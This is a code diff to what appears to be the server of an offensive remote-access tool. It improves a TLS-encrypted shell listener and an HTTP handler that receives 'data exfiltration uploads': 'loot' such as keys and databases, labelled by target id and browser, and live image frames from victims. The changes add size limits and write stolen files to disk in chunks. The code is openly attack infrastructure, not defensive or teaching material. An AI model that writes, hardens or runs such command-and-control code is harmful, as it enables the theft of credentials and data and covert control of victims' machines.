@@ -502,13 +502,24 @@ class ShellManager:
     
     def start_listener(self, port):
         """Start TLS-encrypted listener with graceful port fallback."""
-        # Generate TLS certificate
-        console.print("[dim]Generating TLS certificate...[/]")
-        CFG.cert_file, CFG.key_file = generate_self_signed_cert()
+        raw_sock = None
         
-        # Create SSL context (will be used to wrap each client connection)
-        self.ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
-        self.ssl_context.load_cert_chain(CFG.cert_file, CFG.key_file)
+        # Generate or use provided TLS certificate
+        if not CFG.cert_file or not CFG.key_file:
+            console.print("[dim]Generating TLS certificate...[/]")
+            CFG.cert_file, CFG.key_file = generate_self_signed_cert()
+        
+        # Create SSL context with proper error handling
+        try:
+            self.ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+            self.ssl_context.load_cert_chain(CFG.cert_file, CFG.key_file)
+        except ssl.SSLError as e:
+            console.print(f"[red]SSL Certificate Error: {e}[/]")
+            console.print(f"[yellow]Check cert paths: {CFG.cert_file}, {CFG.key_file}[/]")
+            raise
+        except FileNotFoundError as e:
+            console.print(f"[red]Certificate file not found: {e}[/]")
+            raise
         
         for attempt_port in range(port, port + 10):
             try:
@@ -525,9 +536,10 @@ class ShellManager:
                 CFG.listener_port = attempt_port
                 console.print(f"[green]TLS Listener on port {attempt_port}[/]")
                 return
-            except OSError:
+            except OSError as e:
                 if raw_sock:
                     raw_sock.close()
+                    raw_sock = None
                 continue
         raise Exception(f"No available ports in range {port}-{port+9}!")
         
@@ -922,7 +934,9 @@ function copyCmd() {{
             console.print(f"[yellow]Page served to {self.client_address[0]}[/]")
 
     def do_POST(self):
-        """Handle data exfiltration uploads (Text & Binary)."""
+        """Handle data exfiltration uploads (Text & Binary) with size limits."""
+        MAX_UPLOAD_SIZE = 50 * 1024 * 1024  # 50MB limit to prevent DoS
+        
         try:
             if self.path.startswith('/ups'):
                 from urllib.parse import urlparse, parse_qs
@@ -932,28 +946,46 @@ function copyCmd() {{
                 browser = query.get('b', ['unknown'])[0]
                 target_id = query.get('id', ['unknown'])[0]
                 
-                # Get body as BYTES (crucial for images)
+                # Validate Content-Length to prevent DoS
                 length = int(self.headers.get('Content-Length', 0))
-                data = self.rfile.read(length)
+                if length > MAX_UPLOAD_SIZE:
+                    console.print(f"[red]Upload rejected: {length} bytes exceeds limit[/]")
+                    self.send_response(413)  # Payload Too Large
+                    self.end_headers()
+                    return
+                
+                if length == 0:
+                    self.send_response(400)
+                    self.end_headers()
+                    return
                 
                 if dtype == 'live':
-                    # Save "Live Feed" frame
+                    # Live feed - read into memory (small frames only)
+                    data = self.rfile.read(length)
                     with open("live.jpg", "wb") as f:
                         f.write(data)
                     self.send_response(200); self.end_headers()
                     return
 
-                # Normal Loot (Keys/DBs)
+                # Normal Loot - stream directly to disk for large files
                 loot_dir = os.path.join(os.path.dirname(__file__), "loot")
                 os.makedirs(loot_dir, exist_ok=True)
                 
                 fname = f"{dtype}_{target_id}_{browser}.txt"
                 fpath = os.path.join(loot_dir, fname)
                 
+                # Stream to disk in chunks to prevent memory exhaustion
                 with open(fpath, 'wb') as f:
-                    f.write(data)
+                    remaining = length
+                    while remaining > 0:
+                        chunk_size = min(8192, remaining)
+                        chunk = self.rfile.read(chunk_size)
+                        if not chunk:
+                            break
+                        f.write(chunk)
+                        remaining -= len(chunk)
                 
-                console.print(f"[green]Creating loot file: {fname}[/]")
+                console.print(f"[green]Loot saved: {fname} ({length} bytes)[/]")
                 self.send_response(200); self.end_headers()
             else:
                 self.send_response(404); self.end_headers()
